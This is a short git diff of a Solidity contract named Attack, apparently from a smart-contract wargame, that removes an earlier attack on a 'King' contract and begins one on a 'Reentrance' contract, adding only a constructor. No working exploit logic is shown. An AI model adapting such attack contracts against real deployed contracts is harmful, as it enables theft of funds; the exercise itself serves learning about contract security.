@@ -1,20 +1,12 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.12;
 
-import "./King.sol";
+import "./Reentrance.sol";
 
 contract Attack {
-    King public kingContract;
+    Reentrance public reentranceContract;
 
-    constructor(address payable _kingContract) {
-        kingContract = King(_kingContract);
-    }
-
-    function attack() public payable {
-        address payable addr = payable(address(kingContract));
-
-        (bool success, ) = addr.call{value: msg.value}("");
-
-        require(success, "call failed");
+    constructor(address payable _reentranceContract) public {
+        reentranceContract = Reentrance(_reentranceContract);
     }
 }
